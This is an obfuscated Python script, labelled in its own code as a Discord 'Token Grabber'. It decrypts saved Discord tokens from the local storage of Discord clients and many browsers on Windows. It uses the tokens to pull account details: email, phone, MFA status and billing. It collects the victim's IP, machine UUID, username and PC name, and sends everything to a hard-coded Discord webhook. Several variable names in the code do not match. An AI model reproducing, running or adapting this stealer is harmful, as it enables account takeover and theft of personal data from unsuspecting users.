from base64 import b64decode
钑=None
𐣥=True
ﱖ=open
𐫅=IndexError
𢽩=False
揼=bool
𐡰=len
שׂ=abs
from Crypto.Cipher import AES
ࡄ=AES.MODE_GCM
𥁥=AES.new
from win32crypt import CryptUnprotectData
from os import getlogin,listdir
from json import loads
from re import findall
from urllib.request import Request,urlopen
from subprocess import Popen,PIPE
import requests,json,os
𞸅=os.path
ڪ=os.getenv
𐬡=json.dumps
𐠮=requests.get
from datetime import datetime
𥓎=datetime.strptime
𐪉=[]
𐴁=[]
𫑥=[]
def 胲(buff,master_key):
 try:
  return 𥁥(CryptUnprotectData(master_key,钑,钑,钑,0)[1],ࡄ,buff[3:15]).decrypt(buff[15:])[:-16].decode()
 except:
  return "Error"
def 𛇴():
 ﳭ="None"
 try:
  ﳭ=urlopen(Request("https://api.ipify.org")).read().decode().strip()
 except:pass
 return ﳭ
def ꇼ():
 㠣=Popen("wmic csproduct get uuid",shell=𐣥,stdin=PIPE,stdout=PIPE,stderr=PIPE)
 return(㠣.stdout.read()+㠣.stderr.read()).decode().split("\n")[1]
def 𐠙():
 𐢅=[]
 𫑥=[]
 𞡡=ڪ('LOCALAPPDATA')
 𣐣=ڪ('APPDATA')
 𦳽=𞡡+"\\Google\\Chrome\\User Data"
 𐫍={'Discord':𣐣+'\\discord','Discord Canary':𣐣+'\\discordcanary','Lightcord':𣐣+'\\Lightcord','Discord PTB':𣐣+'\\discordptb','Opera':𣐣+'\\Opera Software\\Opera Stable','Opera GX':𣐣+'\\Opera Software\\Opera GX Stable','Amigo':𞡡+'\\Amigo\\User Data','Torch':𞡡+'\\Torch\\User Data','Kometa':𞡡+'\\Kometa\\User Data','Orbitum':𞡡+'\\Orbitum\\User Data','CentBrowser':𞡡+'\\CentBrowser\\User Data','7Star':𞡡+'\\7Star\\7Star\\User Data','Sputnik':𞡡+'\\Sputnik\\Sputnik\\User Data','Vivaldi':𞡡+'\\Vivaldi\\User Data\\Default','Chrome SxS':𞡡+'\\Google\\Chrome SxS\\User Data','Chrome':𦳽+'Default','Epic Privacy Browser':𞡡+'\\Epic Privacy Browser\\User Data','Microsoft Edge':𞡡+'\\Microsoft\\Edge\\User Data\\Defaul','Uran':𞡡+'\\uCozMedia\\Uran\\User Data\\Default','Yandex':𞡡+'\\Yandex\\YandexBrowser\\User Data\\Default','Brave':𞡡+'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Iridium':𞡡+'\\Iridium\\User Data\\Default'}
 for ﯔ,ﯕ in 𐫍.items():
  if not 𞸅.exists(ﯕ):continue
  try:
   with ﱖ(ﯕ+f"\\Local State","r")as 唾:
    ﳀ=loads(唾.read())['os_crypt']['encrypted_key']
    唾.close()
  except:continue
  for 唾 in listdir(ﯕ+f"\\Local Storage\\leveldb\\"):
   if not 唾.endswith(".ldb")and 唾.endswith(".log"):continue
   else:
    try:
     with ﱖ(ﯕ+f"\\Local Storage\\leveldb\\{file}","r",errors='ignore')as files:
      for ڨ in files.readlines():
       ڨ.strip()
       for 𐬖 in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",ڨ):
        𐪉.append(𐬖)
    except PermissionError:continue
  for 𠐈 in 𐪉:
   if 𠐈.endswith("\\"):
    𠐈.replace("\\","")
   elif 𠐈 not in 𐴁:
    𐴁.append(𠐈)
  for 𞤣 in 𐴁:
   try:
    螄=胲(b64decode(𞤣.split('dQw4w9WgXcQ:')[1]),b64decode(ﳀ)[5:])
   except 𐫅=="Error":continue
   𫑥.append(螄)
   for 𞤣 in 𫑥:
    if 𞤣 not in 𐢅:
     𐢅.append(𞤣)
     𢃙={'Authorization':螄,'Content-Type':'application/json'}
     try:
      𐫙=𐠮('https://discordapp.com/api/v6/users/@me',headers=𢃙)
     except:continue
     if 𐫙.status_code==200:
      𨑩=𐫙.json()
      ﳭ=𛇴()
      笎=ڪ("UserName")
      ߛ=ڪ("COMPUTERNAME")
      ߜ=f'{res_json["username"]}#{res_json["discriminator"]}'
      ࢤ=𨑩['id']
      뵎=𨑩['email']
      𤶩=𨑩['phone']
      𐮍=𨑩['mfa_enabled']
      𥩸=𢽩
      𐫙=𐠮('https://discordapp.com/api/v6/users/@me/billing/subscriptions',headers=𢃙)
      掝=𐫙.json()
      𥩸=揼(𐡰(掝)>0)
      𠝨=0
      if 𥩸:
       ﴧ=𥓎(掝[0]["current_period_end"].split('.')[0],"%Y-%m-%dT%H:%M:%S")
       𫩶=𥓎(掝[0]["current_period_start"].split('.')[0],"%Y-%m-%dT%H:%M:%S")
       𠝨=שׂ((𫩶-ﴧ).days)
      뮫=f"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{tok}`\n
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""      
      𐦩=𐬡({'content':뮫,'username':'Token Grabber - Made by Astraa','avatar_url':'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
      try:
       𞺙={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
       𪍪=Request('https://discord.com/api/webhooks/1353095257767809074/iA8hWf5AZU0XjWg2Z-Ihq-jEFnE_PrPHksg7_zHP4CKtxk5xY4RpmemzoVxZz5cDlJs1',data=𐦩.encode(),headers=𞺙)
       urlopen(𪍪)
      except:continue
    else:continue
if __name__=='__main__':
 𐠙()
